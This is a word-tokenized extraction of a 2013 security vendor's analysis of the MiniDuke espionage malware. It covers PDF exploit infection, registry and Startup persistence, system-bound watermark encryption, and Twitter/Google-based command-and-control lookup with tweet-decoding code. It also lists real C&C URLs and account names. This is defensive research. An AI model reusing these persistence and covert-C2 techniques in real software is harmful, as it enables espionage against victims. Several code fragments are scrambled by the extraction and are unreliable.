"_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_"], ["General", "information", ":", "Discovery", "date", ":", "February", "27", "2013", "."], ["Date", "of", "the", "first", "known", "sample", ":", "June", "2011", "."], ["Risk", ":", "Document", "exfiltration", "."], ["2", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "Table", "of", "Contents", "Table", "of", "Contents", "......................................................................................................................................................"], ["3", "1", "."], ["Overview", ".............................................................................................................................................................."], ["5", "2", "."], ["The", "Infection", "Vector", "......................................................................................................................................."], ["6", "3", "."], ["Samples", "..............................................................................................................................................................."], ["6", "4", "."], ["Packer", "Intelligence", ".........................................................................................................................................."], ["6", "5", "."], ["Modus", "Operandi", "..............................................................................................................................................."], ["7", "5.1", "Notations", "........................................................................................................................................................"], ["7", "5.2", "First", "installation", ".........................................................................................................................................."], ["7", "5.3", "Post", "-", "Install", "Execution", "..............................................................................................................................."], ["7", "5.4"], ["The", "Watermark", "...........................................................................................................................................", "8", "5.4.1", "Data", "layout", "(", "for", "samples", "dated", "2011", ")", "............................................................................................", "9", "5.4.2", "Data", "layout", "(", "samples", "in", "2012/2013", ")", "..........................................................................................."], ["10", "5.5"], ["Removing", "the", "Watermark", "...................................................................................................................."], ["10", "5.5.1", "Removal", "of", "the", "watermark", "through", "cryptanalysis", "................................................................."], ["11", "5.6"], ["Decrypting", "the", "Twitter", "and", "Google", "usernames", "..........................................................................."], ["11", "5.7", "Extraction", "of", "the", "secondary", "Twitter", "username", "..........................................................................."], ["12"], ["The", "Algorithm", "..............................................................................................................................................."], ["12", "5.8", "Interaction", "with", "Twitter", "......................................................................................................................."], ["12", "5.8.1"], ["Decoding", "the", "Tweets", "..........................................................................................................................", "13", "5.9", "Backup", "mechanism", ":", "Google", ".................................................................................................................", "13", "6", ".", "Command", "and", "Control", "..............................................................................................................................."], ["14", "6.1"], ["The", "Tweets", ".................................................................................................................................................", "15", "6.2"], ["The", "Communication", "Protocol", "............................................................................................................."], ["16", "6.4"], ["The", "Encryption", "Algorithm", "for", ".GIF"], ["Files", ".........................................................................................", "17"], ["6.5"], ["Missing", "information", "................................................................................................................................"], ["17", "7", "."], ["Malware", "Versions", "........................................................................................................................................."], ["18", "8", "."], ["Anti", "-", "Reverse", "Techniques", "........................................................................................................................."], ["19", "9", "."], ["Payload", ":", "Backdoor", "......................................................................................................................................."], ["20", "9.1", "Samples", "........................................................................................................................................................"], ["20", "9.2"], ["The", "Loader", "................................................................................................................................................."], ["20", "9.3", "Backdoor", "commands", ".............................................................................................................................."], ["20", "3", "\u00a9", "2013", "Bitdefender", "A"], ["Closer", "Look", "at", "MiniDuke", "9.4", "Servers", "........................................................................................................................................................."], ["21", "10", "."], ["Payload", ":"], ["Turkish", "Backdoor", ".............................................................................................................."], ["22", "10.1", "Sample", "......................................................................................................................................................."], ["22", "10.2", "Modus", "Operandi", "...................................................................................................................................."], ["22", "Appendix", "A", ":", "Process", "Blacklist", "........................................................................................................................."], ["24", "Appendix", "B", ":", "Possible", "channels", "used", "for", "C&C", ".........................................................................................", "24", "Appendix", "C", ":", "Possible", "MD5", "hashes", "for", "payloads", "....................................................................................", "25", "Appendix", "D", ":", "E", "-", "Mail", "samples", "used", "in", "attacks", "..........................................................................................."], ["26", "Appendix", "E", ":", "Twitter", "accounts", "..........................................................................................................................."], ["27", "Appendix", "F", ":", "Forged", "documents", "......................................................................................................................"], ["29", "Appendix", "G", ":", "Samples", "by", "Year", "........................................................................................................................."], ["34", "Table", "of", "Figures", "Figure", "1", ":", "Infection", "mechanism", ".............................................................................................................................."], ["5", "Figure", "2", ":", "The", "watermarking", "process", ".................................................................................................................."], ["9", "Figure", "3", ":", "The", "e", "-", "mail", "bundled", "with", "the", "infected", "PDF", "file", ".........................................................................", "26", "4", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "1", "."], ["Overview"], ["This", "piece", "of", "malware", "is", "made", "of", "three", "components", ":", "pdf", ",", "main", ",", "payload", "."], ["The", "PDF", "file", "embeds", "exploit", "code", "and", "a", "dropper", "that", "writes", "the", "\u201c", "main", "\u201d", "DLL", "component", "on", "the", "drive", "."], ["Additionally", ",", "the", "original", "PDF", "also", "contains", "a", "clean", "PDF", "file", "used", "in", "the", "social", "engineering", "stage", "."], ["Figure", "1", ":", "Infection", "mechanism", "As", "the", "malicious", "PDF", "file", "is", "opened", ",", "the", "Adobe", "process", "gets", "exploited", ",", "which", "results", "in", "running", "the", "dropper", "."], ["In", "turn", ",", "upon", "the", "dropper", "\u2019s", "execution", ",", "the", "host", "process", "is", "killed", "and", "the", "clean", "PDF", "file", "gets", "displayed", "."], ["This", "trick", "allows", "the", "malware", "to", "run", "inconspicuously", ",", "without", "the", "user", "noticing", "that", "something", "has", "happened", "in", "the", "background", "."], ["The", "main", "DLL", "file", "is", "also", "loaded", "and", "runs", "in", "installation", "mode", "(", "see", "the", "First", "Installation", "section", "\u2193", ")", "."], ["Once", "installed", ",", "the", "malware", "calls", "back", "home", "using", "a", "URL", "found", "via", "Twitter", "or", "Google", "search", "query", "."], ["When", "successfully", "connected", ",", "new", "updates", "or", "payloads", "are", "installed", "under", "the", "disguise", "of", ".gif", "images", "."], ["There", "may", "be", "other", "infection", "mechanisms", "other", "than", "PDF", "files", ",", "but", "they", "remain", "unknown", "at", "the", "moment", "."], ["5", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "2", "."], ["The", "Infection", "Vector"], ["Until", "now", ",", "we", "have", "only", "found", "spreading", "mechanisms", "that", "use", "social", "engineering", "via", "malicious", "PDF", "files", "sent", "over", "e", "-", "mail", "(", "see", "Appendix", "F", ":", "Forged", "documents\u2193", ")", "."], ["The", "(", "Appendix", "D", ":", "E", "-", "Mail", "samples", "used", "in", "attacks\u2193", ")", "section", "shows", "such", "a", "sample", "isolated", "from", "a", "real", "-", "life", "attack", "."], ["The", "following", "exploits", "have", "been", "used", "to", "trigger", "the", "infection", ":", "2012"], ["CVE-2011", "-", "2462", "2013"], ["CVE-2013", "-", "0640"], ["The", "infection", "vector", "for", "the", "samples", "dated", "2011", "is", "unknown", "."], ["3", "."], ["Samples"], ["The", "list", "of", "known", "samples", "is", "available", "in", "the", "Samples", "by", "Year", "Appendix", "\u2193.", "4", "."], ["Packer", "Intelligence"], ["The", "file", "contains", "four", "or", "five", "sections", "with", "standard", "names", "such", "as", ":", ".text", ",", ".data", ",", ".reloc", ",", ".edata", ",", ".rdata", "."], ["The", "packer", "code", "is", "relatively", "small", "(", "<", "1024", "bytes", ")", "."], ["It", "is", "encrypted", "and", "located", "in", "the", ".text", "section", "."], ["The", "packer", "is", "used", "to", "decrypt", "the", "main", "code", "located", "in", "the", "largest", "section", "usually", ".data", "or", ".rdata", "."], ["The", "DLL", "file", "only", "exports", "one", "function", "with", "a", "random", "name", "."], ["Decryption", "Code", "=", "<", "buffer", "of", "the", "encrypted", "code", ">", "length", "=", "len(Code", ")"], ["i", "=", "length", "for", "b", "in", "Code", ":", "v", "=", "ROL(b", ",", "i", ")", "length", ";", "<", "store", "decrypted", "value", "(", "v", ")", ">"], ["i", "=", "i", "-", "1", ";", "6", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "5", "."], ["Modus", "Operandi", "5.1", "Notations", "SHA1", ":", "SHA1", "(", "probably", "modified", ")", "area1", ":", "a", "16", "-", "byte", "zone", "in", "the", "malicious", "file", "which", "holds", "the", "query", "string", "for", "Google", "."], ["area2", ":", "a", "128", "-", "byte", "zone", "in", "the", "malicious", "file", "which", "holds", "the", "encrypted", "Twitter", "link", "."], ["5.2", "First", "installation"], ["This", "is", "the", "case", "when", "the", "malware", "is", "started", "by", "the", "dropper", "."], ["The", "malware", "awaits", "for", "the", "user", "to", "interact", "with", "the", "computer", "and", "verifies", "the", "input", "from", "mouse", "or", "keyboard", "in", "an", "endless", "loop", "."], ["In", "the", "first", "step", ",", "the", "watermark", "is", "applied", ",", "as", "described", "in", "the", "Watermark", "\u2193", "section", "."], ["After", "the", "watermark", "is", "applied", ",", "the", "malware", "re", "-", "computes", "the", "file", "\u2019s", "checksum", "by", "using", "the", "CheckSumMappedFile", "(", ")", "function", "."], ["The", "file", "is", "dropped", "with", "a", "name", "randomly", "chosen", "from", "a", "list", "in", "the", "%", "ALLUSERSPROFILE%\\"], ["Application", "Data", "folder", "set", "to", "automatically", "start", "after", "reboot", "as", "described", "below", ":", "\uf0b7", "for", "samples", "in", "2011/2012", ":", "the", "malware", "modifies", "the", "Shell", "key", "in", "Software\\Microsoft\\Windows", "NT\\CurrentVersion\\Winlogon", "."], ["The", "key", "holds", "an", "environment", "variable", "which", "is", "set", "to", "\u201c", "rundll32.exe", "<", "path_to_dll", ">", ",", "<", "export_name", ">", "\u201d", "."], ["\uf0b7", "for", "samples", "collected", "in", "2013", ":", "the", "malware", "adds", "a", ".lnk", "file", "to", "the", "Startup", "directory", ",", "which", "would", "execute", "the", "dll", "using", "rundll32.exe", "."], ["If", "there", "is", "already", "a", "variant", "of", "the", "malware", "installed", "before", "the", "copy", "process", ",", "the", "new", "malware", "deletes", "it", "and", "creates", "another", "combination", "of", "names", ",", "as", "well", "as", "a", "new", "environment", "variable", "or", ".lnk", "file", "."], ["5.3", "Post", "-", "Install", "Execution"], ["In", "this", "stage", ",", "the", "malicious", "binary", "checks", "if", "the", "image", "is", "rundll32", "-", "and", "therefore", "if", "it", "is", "run", "on", "the", "system", "through", "the", ".lnk", "file", "set", "in", "the", "Startup", "folder", "or", "if", "it", "is", "run", "from", "the", "environment", "variable", "."], ["Then", ",", "a", "thread", "is", "created", "in", "which", "the", "OpenInputDesktop", "(", ")", "function", "is", "called", "in", "an", "endless", "loop", "with", "a", "sleep", "interval", "of", "5", "seconds", "."], ["The", "malware", "then", "waits", "for", "user", "interaction", "by", "checking", "input", "from", "the", "mouse", "or", "keyboard", "."], ["The", "binary", "also", "checks", "the", "current", "date", ",", "but", "only", "uses", "the", "current", "week", "of", "the", "month", ",", "the", "current", "month", "and", "year", "."], ["The", "sample", "from", "2011", "checks", "for", "the", "current", "date", "using", "http://tycho.usno.navy.mil/cgibin/timer.pl"], ["The", "sample", "from", "2012", "checks", "for", "the", "current", "date", "using", "http://www.timeserver.org/gettime.php?country=China", "7", "\u00a9", "2013", "Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "The", "samples", "compiled", "in", "2013", "get", "the", "current", "date", "from", "the", "operating", "system", "."], ["The", "malware", "then", "removes", "the", "watermark", ",", "decrypts", "the", "data", "section", "and", "attempts", "to", "access", "the", "Twitter", "and", "Google", "accounts", "."], ["When", "either", "of", "the", "sites", "respond", ",", "it", "interprets", "the", "received", "data", "and", "decodes", "the", "tweets", "."], ["When", "the", "tweet", "is", "decoded", ",", "the", "malware", "connects", "to", "the", "command", "and", "control", "server", "in", "the", "message", "and", "send", "information", "about", "the", "infected", "system", "."], ["The", "malware", "then", "awaits", "for", "a", "response", "from", "the", "command", "and", "control", "center", ",", "which", "comes", "as", "an", "encrypted", "GIF", "file", "."], ["Upon", "decryption", ",", "the", "malware", "extracts", "the", "embedded", "payload", "and", "runs", "it", "."], ["The", "payload", "is", "often", "an", "update", "."], ["After", "the", "task", "has", "completed", ",", "the", "malware", "stops", "."], ["Its", "execution", "only", "lasts", "until", "it", "manages", "to", "connect", "to", "a", "Twitter", "account", ",", "then", "it", "exits", ",", "in", "order", "to", "increase", "its", "chances", "of", "staying", "undetected", "."], ["However", ",", "it", "still", "runs", "for", "a", "little", "while", "upon", "every", "operating", "system", "boot", "."], ["The", "analysis", "we", "carried", "inside", "the", "lab", "reveals", "that", "the", "payloads", "are", "not", "persistent", "on", "disk", "."], ["We", "presume", "that", "they", "are", "downloaded", "from", "a", "specific", "location", "whenever", "the", "system", "boots", "up", "."], ["5.4", "The", "Watermark"], ["When", "the", "malware", "is", "ran", "via", "rundll32.exe", "upon", "the", "first", "boot", ",", "it", "creates", "a", "copy", "of", "itself", "named", "as", "tempfile.dat", "(", "in", "some", "samples", ")", "and", "would", "mark", "the", "executable", "file", "in", "order", "to", "prevent", "it", "from", "correctly", "running", "on", "other", "systems", "."], ["This", "watermarking", "process", "involves", "the", "modification", "of", "two", "already", "encrypted", "data", "areas", "at", "the", "end", "of", "the", "executable", "file", "."], ["The", "first", "encrypted", "area", "is", "0x80", "bytes", "large", "and", "holds", "the", "encrypted", "Twitter", "link", "."], ["For", "samples", "dated", "2011", ",", "this", "area", "starts", "with", "encrypted(http://twitter.com/<username", ">", ")"], ["For", "samples", "dated", "2012", "-", "2013", ",", "the", "area", "starts", "with", "encrypted(https://mobile.twitter.com/<username", ">", ")", "8", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "Figure", "2", ":", "The", "watermarking", "process", "The", "switch", "to", "mobile.twitter", "has", "been", "done", "on", "purpose", "in", "order", "to", "keep", "the", "data", "traffic", "to", "a", "minimum", "when", "a", "connection", "with", "Twitter", "is", "made", "."], ["Also", "worth", "mentioning", "is", "the", "fact", "that", "the", "variants", "we", "discovered", "as", "dated", "2012/2013", "are", "connecting", "via", "HTTPS", "."], ["The", "second", "area", "is", "0x10", "bytes", "long", "and", "holds", "an", "encrypted", "string", "that", "is", "used", "to", "perform", "a", "Google", "query", "for", "samples", "from", "2012/2013", "."], ["Depending", "on", "the", "string", "and", "the", "current", "date", ",", "a", "second", "Twitter", "handle", "is", "generated", "."], ["The", "sample", "dated", "2011", "does", "not", "feature", "this", "Google", "search", "mechanism", "."], ["The", "data", "areas", "do", "n\u2019t", "start", "at", "a", "specific", "offset", "."], ["In", "order", "to", "find", "them", ",", "the", "malware", "iterates", "them", "from", "their", "end", "and", "looks", "for", "the", "first", "byte", "that", "is", "not", "zero", "."], ["This", "would", "be", "the", "last", "byte", "from", "the", "small", "area", "(", "which", "is", "0x10", "bytes", "large", ")", "."], ["From", "here", "on", ",", "it", "can", "compute", "where", "the", "larger", "data", "area", "is", "located", "in", "the", "file", "."], ["After", "the", "malware", "has", "identified", "the", "area", "offsets", ",", "it", "would", "start", "encrypting", "them", "."], ["A", "hash", "is", "also", "computed", "on", "specific", "pieces", "of", "system", "information", "and", "will", "be", "used", "in", "the", "encryption", "process", "."], ["5.4.1", "Data", "layout", "(", "for", "samples", "dated", "2011", ")"], ["The", "malware", "enumerates", "every", "network", "interface", ",", "isolates", "the", "first", "DWORD", "in", "the", "description", "and", "writes", "it", "to", "the", "buffer", "."], ["GetIfTable(interfaces", ")", ";", "for", "(", "i", "=", "0", ";", "i", "<", "interfaces.count", ";", "i++", ")", "{", "Buff[i", "]", "=", "*"], ["(", "DWORD*)interfaces[i].bDescription", ";", "}", "9", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "The", "result", "is", "overwritten", "to", "the", "previously", "collected", "data", "."], ["This", "behavior", "is", "probably", "triggered", "by", "a", "bug", "."], ["5.4.2", "Data", "layout", "(", "samples", "in", "2012/2013", ")", "typedef", "struct", "COMPUTER_INFO", "{", "DWORD", "dwSerialNumber", ";", "//", "found", "with", "a", "GetVolumeInformation", "call", "DWORD", "dwCPUID", ";", "//", "found", "with", "the", "CPUID", "instruction", "char", "ComputerName[MAX_COMPUTER_NAME_LENGTH", "+", "1", "]", ";", "}", "COMPUTER_INFO", ",", "*", "PCOMPUTER_INFO", ";"], ["The", "data", "is", "padded", "with", "zeros", "in", "order", "to", "achieve", "a", "block", "of", "0x40", "bytes", "."], ["A", "SHA-1", "hash", "is", "then", "computed", "on", "these", "bytes", ",", "which", "is", "then", "used", "to", "modify", "the", "small", "data", "area", "(", "area1", ")", "."], ["*", "(", "(", "DWORD", "*", ")"], ["*", "(", "(", "DWORD", "*", ")"], ["*", "(", "(", "DWORD", "*", ")"], ["*", "(", "(", "DWORD", "*", ")", "area1", ")", "^="], ["*", "(", "(", "DWORD", "*", ")", "hash", ")", ";", "area1", "+", "4", ")", "^="], ["*", "(", "(", "DWORD", "*", ")", "hash", "+", "4", ")", ";", "area1", "+", "8)", "^="], ["*", "(", "(", "DWORD", "*", ")", "hash", "+", "8)", ";", "area1", "+", "0xC", ")", "^="], ["*", "(", "(", "DWORD", "*", ")", "hash", "+", "0xC", ")", ";", "For", "the", "large", "data", "area", "(", "which", "is", "0x80", "bytes", "long", ")", ",", "the", "malware", "does", "not", "use", "the", "same", "hash", "for", "encryption", "."], ["Instead", ",", "it", "would", "interchange", "the", "first", "DWORD", "with", "the", "second", "one", "in", "the", "structure", "and", "would", "re", "-", "compute", "the", "SHA-1", "hash", "."], ["for", "(", "i=0;i<8;i++", ")", "{", "*", "(", "(", "DWORD", "*", ")"], ["*", "(", "(", "DWORD", "*", ")"], ["*", "(", "(", "DWORD", "*", ")"], ["*", "(", "(", "DWORD", "*", ")", "}", "area2", "area2", "area2", "area2", "+", "+", "+", "+", "i", ")", "^="], ["*", "(", "(", "DWORD", "*", ")", "hash", ")", ";", "i*4", ")", "^="], ["*", "(", "(", "DWORD", "*", ")", "hash", "+", "4", ")", ";", "i*8", ")", "^="], ["*", "(", "(", "DWORD", "*", ")", "hash", "+", "8)", ";", "i*0xC", ")", "^="], ["*", "(", "(", "DWORD", "*", ")", "hash", "+", "0x10", ")", ";", "After", "these", "operations", "have", "completed", ",", "a", "new", "checksum", "on", "the", "file", "is", "computed", "via", "the", "CheckSumMappedFile", "(", ")", "function", "."], ["5.5"], ["Removing", "the", "Watermark"], ["When", "the", "malware", "is", "run", "automatically", "(", "through", "rundll.exe", ")", ",", "the", "watermark", "is", "removed", "."], ["The", "malware", "re", "-", "computes", "the", "hash", "based", "on", "the", "information", "collected", "from", "the", "system", "and", "would", "perform", "a", "XOR", "operation", "with", "the", "keys", "computed", "on", "the", "data", "sections", "as", "described", "in", "the", "Watermark", "\u2191", "section", "."], ["When", "these", "operations", "have", "completed", ",", "the", "sample", "loaded", "in", "memory", "would", "not", "feature", "the", "watermark", "and", "the", "data", "can", "be", "decrypted", "."], ["10", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "In", "order", "to", "deter", "analysis", "and", "avoid", "identification", "in", "automated", "malware", "research", "systems", ",", "the", "malware", "iterates", "through", "processes", "and", "looks", "for", "potentially", "dangerous", "processes", "listed", "in", "the", "Appendix", "A", ":", "Process", "Blacklist", "\u2193", "section", "."], ["If", "it", "finds", "a", "blacklisted", "process", ",", "the", "malware", "modifies", "the", "first", "DWORD", "in", "the", "structure", "to", "be", "hashed", "in", "order", "to", "ensure", "that", "the", "data", "can", "not", "be", "correctly", "decrypted", "."], ["5.5.1"], ["Removal", "of", "the", "watermark", "through", "cryptanalysis"], ["As", "we", "discussed", "in", "the", "previous", "paragraphs", ",", "we", "know", "that", "the", "full", "Twitter", "link", "used", "by", "this", "specific", "sample", "is", "located", "in", "the", "second", "data", "section", "."], ["Upon", "decryption", ",", "the", "buffer", "should", "start", "with", "http(s)://(mobile|m)twitter.com", "which", "means", "that", "we", "could", "find", "out", "the", "encryption", "key", "used", "for", "watermarking", ",", "as", "the", "encryption", "algorithm", "is", "a", "constant", ",", "just", "like", "the", "encrypted", "data", "."], ["We", "can", "find", "all", "the", "16", "bytes", ",", "since", "the", "plain", "-", "text", "is", "over", "16", "bytes", "long", "."], ["As", "soon", "as", "we", "had", "the", "key", ",", "we", "could", "completely", "decrypt", "the", "full", "link", ",", "including", "the", "Twitter", "username", "."], ["For", "the", "first", "data", "section", "-", "where", "the", "Google", "hyperlink", "is", "stored", "-", "cryptanalysis", "can", "not", "be", "performed", "as", "we", "do", "n\u2019t", "have", "a", "prefix", "of", "the", "encrypted", "text", "."], ["More", "than", "that", ",", "the", "length", "of", "the", "encrypted", "data", "is", "exactly", "the", "same", "as", "the", "length", "of", "the", "key", "."], ["5.6"], ["Decrypting", "the", "Twitter", "and", "Google", "usernames"], ["The", "process", "starts", "with", "removing", "the", "watermark", ",", "as", "described", "in", "the", "Removing", "the", "Watermark", "\u2191", "section", "."], ["At", "this", "point", ",", "we", "can", "isolate", "the", "data", ",", "although", "it", "is", "encrypted", "."], ["We", "proceed", "then", "with", "decrypting", "the", "16", "-", "byte", "section", "that", "holds", "the", "Google", "username", "."], ["The", "decryption", "key", "is", "obtained", "by", "computing", "the", "CRC", "on", "the", "unpacked", "code", "."], ["The", "code", "starts", "at", "offset", "0xC", "and", "spans", "until", "the", "beginning", "of", "the", "data", "section", "(", "which", "is", "0x80", "bytes", "long", ")", "."], ["code_crc", "=", "crc32(code_begin", ",", "code_end", ")", ";", "for", "(", "i=3", ";", "i>=0", ";", "i--", ")", "{", "*", "(", "(", "DWORD*)area1", "+", "i*sizeof(DWORD", ")", ")", "^=", "code_crc", ";", "code_crc", "=", "ROR(code_crc", ",", "8)", ";", "}"], ["Going", "further", ",", "the", "large", "area", "is", "decrypted", "with", "the", "following", "algorithm", ":"], ["unsigned", "char", "c", "=", "0", ";", "for", "(", "i=0", ";", "i<0x40", ";", "i++", ")", "{", "c", "=", "c", "-", "1", ";", "11"], ["\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "area2[i", "]", "=", "(", "ROL(area2[i", "]", ",", "c", ")", "-", "c", ")", "^", "c", ";", "if", "(", "area2[i", "]", "=", "=", "'", "\\0", "'", ")", "{", "break", ";", "}", "}"], ["The", "result", "holds", "the", "Twitter", "link", "with", "the", "username", "."], ["5.7", "Extraction", "of", "the", "secondary", "Twitter", "username"], ["If", "the", "primary", "Twitter", "username", "ca", "n\u2019t", "be", "accessed", "or", "if", "there", "is", "an", "error", "while", "contacting", "the", "C&C", "server", "mentioned", "in", "the", "first", "tweet", ",", "the", "malware", "will", "attempt", "the", "same", "operation", "with", "the", "secondary", "Twitter", "account", "."], ["This", "secondary", "account", "is", "derived", "from", "the", "Google", "ID", "(", "which", "is", "hardcoded", "into", "the", "sample", ")", "and", "the", "current", "date", "(", "current", "week", ")", "."], ["This", "means", "that", "a", "different", "ID", "should", "come", "up", "every", "week", "."], ["The", "Algorithm"], ["The", "malware", "gets", "the", "current", "date", ",", "but", "only", "keeps", "the", "week", "of", "the", "month", ",", "month", "and", "year", "."], ["These", "pieces", "of", "data", "are", "then", "concatenated", "with", "the", "decrypted", "data", "in", "the", "first", "data", "section", "."], ["A", "SHA-1", "hash", "is", "computed", "on", "a", "buffer", "that", "has", "the", "following", "structure", ":", "Date|GoogleSearchTerm", "."], ["The", "hash", "is", "then", "converted", "to", "Base64", "and", "isolates", "the", "first", "N", "bytes", "of", "the", "buffer", ",", "which", "are", "determined", "by", ":", "N", "=", "(", "*", "(", "DWORD", "*", ")", "base64_string", "%", "mod_val", ")"], ["+", "add_val", ";", "//", "(", "mod_val", ",", "add_val", ")", "are", "//", "(", "8", ",", "6", ")", "for", "samples", "dated", "2011", "//", "(", "6", ",", "7", ")", "for", "samples", "dated", "2012/2013"], ["Special", "characters", "are", "then", "stripped", "from", "the", "resulting", "string", "."], ["Character", "\u2019", "+", "\u2019", "becomes", "\u2019", "a", "\u2019", ",", "and", "character", "\u2019", "/", "\u2019", "becomes", "\u2019", "9", "\u2019", "."], ["5.8", "Interaction", "with", "Twitter"], ["The", "malware", "variant", "dated", "2011", "connects", "to", "twitter.com", ",", "while", "the", "variants", "isolated", "in", "2012/2013", "use", "mobile.twitter.com", "instead", "."], ["Every", "sample", "comes", "hardcoded", "with", "a", "version", "number", "in", "the", "form", "of", "a", "string", "."], ["Every", "version", "uses", "a", "different", "Twitter", "username", "."], ["These", "are", "the", "Twitter", "accounts", "extracted", "from", "samples", "throughout", "the", "years", ":", "12", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "2011"], ["ObamaApril"], ["Etoursinfo", "2012"], ["RuthHarper14", "CurtinDiana", "trulrich", "zokath", "2013", "KellyPalmer20"], ["EdithAlbert1", "FontenotHoward"], ["JennieCartagena", "LorindaRay1"], ["TinaPena10"], ["The", "tweets", "are", "encoded", "in", "the", "following", "form", ":", "uri!wp07VkkxYt3Ag", "/", "bdbNgi3smPJvX7+HLEw5H6", "/", "S0RsmHKtA=="], ["After", "decryption", ",", "the", "tweets", "would", "become", "URLs", "to", "update", "servers", "."], ["5.8.1"], ["Decoding", "the", "Tweets"], ["The", "buffers", "are", "decoded", "using", "Base64", ",", "then", "rotates", "the", "output", "to", "the", "right", "(", "ROR", ")", "with", "a", "variable", "number", "of", "bytes", ",", "and", "then", "0x5A", "is", "subtracted", "."], ["The", "encoding", "is", "fairly", "easy", "by", "reversing", "the", "algorithm", "."], ["def", "ror(val", ",", "pos", "):", "return", "(", "(", "val", ">", ">", "pos", ")", "&", "0xff", ")", "|"], ["(", "(", "val", "<", "<", "(", "8", "-", "poz", ")", ")", "&", "0xff", ")", "crypt", "="], ["base64.b64decode(din", ")"], ["c", "=", "0", "dout", "=", "\"", "\"", "for", "x", "in", "crypt", ":", "dout", "=", "dout", "+", "chr((ror(ord(x", ")", ",", "c", ")", "-", "0x5A", ")", "&", "0xff", ")"], ["c", "=", "(", "c", "+", "1", ")", "%", "8", "//", "\u201c", "dout", "\u201d", "holds", "the", "decoded", "string", "//", "\"", "din", "\"", "is", "the", "initially", "-", "encrypted", "string", "."], ["5.9", "Backup", "mechanism", ":", "Google"], ["If", "there", "are", "connectivity", "issues", "while", "accessing", "Twitter", "or", "if", "no", "tweets", "holding", "a", "uri", "!"], ["command", "are", "found", ",", "the", "malware", "falls", "back", "to", "an", "alternate", "backup", "mechanism", "."], ["A", "search", "query", "with", "a", "13"], ["\u00a9", "2013", "Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "series", "of", "characters", "is", "sent", "to", "Google", "."], ["The", "results", "are", "then", "processed", "until", "an", "\u201c", "uri", "!", "\u201d", "pattern", "is", "found", "."], ["2011"], ["zZkadfDljFE94fFa", "2012"], ["DFJ2dskl2394FDLI"], ["9LidWIdf230DFkdL"], ["zZkOERmcrD94fFLa"], ["666wifjDfjalQWLK", "2013", "lUFujJFDiufLKWPR", "HkyeiIDKiroLaKYr"], ["HJUlredIREYUkLLa", "lUFEfiHKDroLaKYr", "HJUlOIDIREYUkLLa", "lUFEfiHKljfLKWPR"], ["Although", "it", "has", "been", "implemented", ",", "this", "mechanism", "has", "not", "been", "used", "in", "the", "wild", "."], ["A", "Google", "search", "for", "these", "sequences", "did", "not", "yield", "any", "results", "."], ["Most", "likely", ",", "the", "mechanism", "has", "been", "implemented", "either", "for", "possible", "victims", "who", "had", "access", "to", "Twitter", "blocked", "in", "the", "firewall", "or", "as", "a", "failsafe", "mechanism", ",", "should", "the", "Twitter", "accounts", "get", "suspended", "."], ["Also", "worth", "mentioning", "is", "the", "fact", "that", "the", "publication", "of", "any", "technical", "papers", "about", "MiniDuke", "with", "mentions", "to", "the", "uri", "!", "command", "and", "these", "unique", "sequences", "would", "also", "activate", "this", "mechanism", "."], ["If", "an", "infected", "system", "is", "unable", "to", "connect", "to", "Twitter", "anymore", ",", "it", "would", "still", "be", "able", "to", "call", "back", "home", ",", "as", "the", "Google", "query", "would", "return", "the", "C&C", "address", "in", "these", "technical", "papers", "."], ["6", "."], ["Command", "and", "Control"], ["Each", "Twitter", "username", "is", "associated", "with", "as", "many", "command", "and", "control", "centers", "as", "tweets", "."], ["The", "tweets", "are", "encoded", "as", "described", "in", "the", "Decoding"], ["the", "Tweets", "\u2191", "section", "."], ["After", "the", "C&C", "address", "is", "decoded", ",", "the", "malware", "concatenates", "it", "with", "index.php", "or", "main.htm", ",", "default.htm", ",", "home.htm", "etc", "."], ["See", "the", "Appendix", "B", ":", "Possible", "channels", "used", "for", "C&C", "section", "\u2193."], ["2011"], ["ObamaApril", "\u2194", "http://afgcall.com/demo/index.php", "etoursinfo", "\u2194", "http://hottraveljobs.com/forum/docs/info.php", "14", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "2012"], ["RuthHarper14", "\u2194", "http://arabooks.ch/events/", "trulrich", "\u2194", "http://tsoftonline.com/conf/", "zokath", "\u2194", "http://www.tsoftonline.com/engine/", "2013"], ["EdithAlbert11", "\u2194", "http://tsoftonline.com/views/"], ["FontenotHoward", "\u2194", "http://arabooks.ch/lib/"], ["TinaPena10", "\u2194", "http://arabooks.ch/srch/", "LorindaRay1", "\u2194", "http://artas.org/engine/"], ["In", "the", "case", "of", "Twitter", "usernames", "JennieCartagena", "and", "CurtinDiana", ",", "there", "are", "no", "details", "about", "the", "C&Cs", ",", "as", "these", "accounts", "had", "been", "suspended", "and", "no", "information", "was", "cached", "by", "Google", "."], ["6.1"], ["The", "Tweets"], ["The", "Twitter", "accounts", "and", "their", "corresponding", "messages", "are", "listed", "in", "the", "Appendix", "E", ":", "Twitter", "accounts", "section\u2193", ",", "along", "with", "their", "timestamp", "-", "the", "date", "in", "which", "action", "was", "taken", "by", "the", "attacking", "party", "."], ["The", "language", "of", "these", "tweets", "is", "particular", "for", "non", "-", "native", "English", "speakers", "-", "indefinite", "articles", "are", "missing", ",", "but", "the", "definite", "ones", "are", "present", "."], ["This", "is", "a", "feature", "particular", "to", "a", "small", "number", "of", "relatively", "popular", "languages", "that", "are", "spoken", "in", "Indonesia", "or", "Middle", "East", "."], ["2011"], ["ObamaApril", "uri!wp07VkkxYt3Ag", "/", "bdbNgi3smPJvX7+HLEw5H6", "/", "S0RsmHKtA=="], ["etoursinfo", "uri!wp07VkkxYmHJnTtmuxrvY8ST8m6It3LjiYEnZvz4Yl", "/", "JezdMPBkw5IiVC1al", "."], ["2012"], 